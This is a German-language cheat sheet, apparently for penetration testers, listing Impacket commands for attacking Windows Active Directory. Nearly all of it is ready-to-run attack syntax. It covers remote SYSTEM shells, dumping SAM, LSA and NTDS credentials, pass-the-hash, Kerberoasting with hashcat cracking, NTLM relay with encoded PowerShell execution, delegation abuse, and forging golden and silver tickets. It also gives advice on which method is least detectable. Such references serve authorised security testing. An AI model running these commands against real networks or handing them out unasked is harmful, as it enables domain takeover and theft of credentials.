Grundlagen & Syntax
Skript-Speicherort (Kali/Debian)
/usr/share/doc/python3-impacket/examples/ # oder als Alias: impacket-psexec, impacket-secretsdump …
Allgemeines Auth-Schema
tool.py DOMAIN/USER:PASSWORT@TARGET
Pass-the-Hash (PTH)
tool.py DOMAIN/USER@TARGET -hashes :NTLM_HASH # LM-Teil kann leer bleiben: -hashes :NTLM
Kerberos-Auth (Pass-the-Ticket)
export KRB5CCNAME=ticket.ccache tool.py DOMAIN/USER@TARGET -k -no-pass -dc-ip DC_IP
Domain-Controller angeben
tool.py DOMAIN/USER:PASS@TARGET -dc-ip 10.0.0.1
Installation via pip
pip3 install impacket # oder Kali: sudo apt install python3-impacket
Tipp: Kali-Pakete legen Aliases an (impacket-psexec, impacket-secretsdump usw.) — direkt nutzbar ohne Pfadangabe.
💻
Remote Execution
psexec — vollständige SYSTEM-Shell
psexec.py DOMAIN/USER:PASS@TARGET psexec.py DOMAIN/USER@TARGET -hashes :NTLM
smbexec — kein Binary-Upload nötig
smbexec.py DOMAIN/USER:PASS@TARGET
wmiexec — WMI-basiert (semi-interaktiv)
wmiexec.py DOMAIN/USER:PASS@TARGET wmiexec.py DOMAIN/USER:PASS@TARGET "cmd /c whoami" wmiexec.py DOMAIN/USER:PASS@TARGET -shell-type powershell
dcomexec / atexec
dcomexec.py DOMAIN/USER:PASS@TARGET "cmd.exe" atexec.py DOMAIN/USER:PASS@TARGET "cmd /c whoami"
Unterschied: psexec lädt ein Binary hoch (laut, erkennbar). smbexec nutzt cmd-Befehle via Service. wmiexec ist am unauffälligsten — kein Upload, kein Service.
🔑
secretsdump.py
SAM + LSA Secrets + NTDS (remote)
secretsdump.py DOMAIN/USER:PASS@TARGET
Pass-the-Hash
secretsdump.py DOMAIN/USER@TARGET -hashes :NTLM
Nur NTDS.dit dumpen (Domain Controller)
secretsdump.py -just-dc DOMAIN/USER:PASS@DC_IP secretsdump.py -just-dc-ntlm DOMAIN/USER:PASS@DC_IP
Offline-Dump (lokale Dateien)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
Passwort-History einschließen
secretsdump.py -just-dc-ntlm -history DOMAIN/USER:PASS@DC
Output: Format DOMAIN\USER:RID:LM:NT::: — der NT-Hash (rechts vom zweiten Doppelpunkt) ist für PTH und Cracking relevant.
🎫
Kerberoasting
SPNs auflisten (ohne Ticket-Anfrage)
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP
TGS-Tickets anfordern und speichern
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP \ -request -outputfile tgs.txt
Cracken mit hashcat (Modus 13100)
hashcat -m 13100 tgs.txt rockyou.txt hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule
Cracken mit John the Ripper
john --format=krb5tgs tgs.txt --wordlist=rockyou.txt
Ziel: Dienstkonten mit SPN haben oft schwache Passwörter. Kerberoasting erfordert nur ein gültiges Domain-Konto — kein Admin nötig.
🎟
Kerberos-Tickets
TGT anfordern (mit Passwort)
getTGT.py DOMAIN/USER:PASS # Erzeugt USER.ccache im aktuellen Verzeichnis
TGT via Pass-the-Hash
getTGT.py DOMAIN/USER -hashes :NTLM_HASH
Service Ticket (ST) anfordern
getST.py DOMAIN/USER:PASS -spn cifs/TARGET.DOMAIN
S4U-Impersonation (Constrained Delegation)
getST.py DOMAIN/USER:PASS \ -impersonate Administrator \ -spn cifs/TARGET.DOMAIN
AS-REP Roasting (kein Preauthentication)
GetNPUsers.py DOMAIN/ -usersfile users.txt \ -no-pass -format hashcat -dc-ip DC_IP # Hashcat Modus: -m 18200
Ticket aktivieren und nutzen
export KRB5CCNAME=Administrator.ccache klist # Ticket verifizieren psexec.py -k -no-pass DOMAIN/Administrator@TARGET

ntlmrelayx — NTLM Relay
SMB-Relay auf einzelnes Ziel
ntlmrelayx.py -smb2support -t smb://TARGET_IP
Mit Befehlsausführung
ntlmrelayx.py -smb2support -t smb://TARGET \ -c "powershell -e BASE64_PAYLOAD"
SAM-Dump bei Relay
ntlmrelayx.py -smb2support -t smb://TARGET --sam
Mehrere Ziele aus Datei
ntlmrelayx.py -smb2support -tf targets.txt
LDAP-Relay — Rechteerhöhung
ntlmrelayx.py -smb2support \ -t ldap://DC_IP --escalate-user lowpriv
ADCS ESC8 — Zertifikat via NTLM Relay
ntlmrelayx.py -smb2support \ -t https://ADCS/certsrv/certfnsh.asp \ --adcs --template User
Vorbereitung: SMB-Signing muss auf dem Ziel deaktiviert sein. Kombinieren mit Responder (ohne SMB/HTTP) zum Triggern von Authentifizierungen.

SMB-Client & Enumeration
Interaktiver SMB-Client
smbclient.py DOMAIN/USER:PASS@TARGET smbclient.py DOMAIN/USER@TARGET -hashes :NTLM
Domain-Gruppen abfragen
net.py DOMAIN/USER:PASS@DC group \ --group "Domain Admins"
Alle Domain-User auflisten
net.py DOMAIN/USER:PASS@DC user
SID-Enumeration
lookupsid.py DOMAIN/USER:PASS@TARGET
Registry-Zugriff
reg.py DOMAIN/USER:PASS@TARGET query \ -keyName HKLM\\SAM
Dienste auflisten
services.py DOMAIN/USER:PASS@TARGET list

LDAP & AD-Enumeration
Vollständiger AD-Dump (HTML/JSON/CSV)
ldapdomaindump.py DOMAIN/USER:PASS@DC_IP # Erzeugt domain_*.html, domain_*.json …
Alle AD-User abrufen
GetADUsers.py DOMAIN/USER:PASS -all -dc-ip DC_IP
Delegation-Konfigurationen prüfen
findDelegation.py DOMAIN/USER:PASS -dc-ip DC_IP
Computer-Konto hinzufügen (MachineAccountQuota)
addcomputer.py DOMAIN/USER:PASS \ -computer-name MEIN-PC$ \ -computer-pass 'Password123!'
RBCD — Resource-Based Constrained Delegation
rbcd.py -delegate-to TARGET$ \ -delegate-from MEIN-PC$ \ -action write DOMAIN/USER:PASS -dc-ip DC_IP
RBCD-Angriff: Computer-Konto anlegen → msDS-AllowedToActOnBehalfOfOtherIdentity setzen → S4U2Self/S4U2Proxy → Ticket für Admin erhalten.

Pivoting & Silver/Golden Ticket
Golden Ticket erstellen
ticketer.py -nthash KRBTGT_NTLM \ -domain-sid S-1-5-21-... \ -domain DOMAIN.LOCAL Administrator
Silver Ticket erstellen
ticketer.py -nthash SERVICE_NTLM \ -domain-sid S-1-5-21-... \ -domain DOMAIN.LOCAL \ -spn cifs/TARGET.DOMAIN Administrator
Ticket nutzen
export KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass DOMAIN/Administrator@TARGET
Kombinieren mit proxychains
proxychains impacket-psexec \ DOMAIN/USER:PASS@INTERNAL_TARGET
KRBTGT-Hash aus secretsdump
# Suche in secretsdump-Output: DOMAIN\krbtgt:502:<LM>:<NT>::: # NT-Hash → -nthash Parameter
Golden Ticket: Erfordert KRBTGT-NT-Hash + Domain-SID. Gültig 10 Jahre (Standard-TTL). Funktioniert auch nach Passwort-Reset (bis KRBTGT 2x geändert).
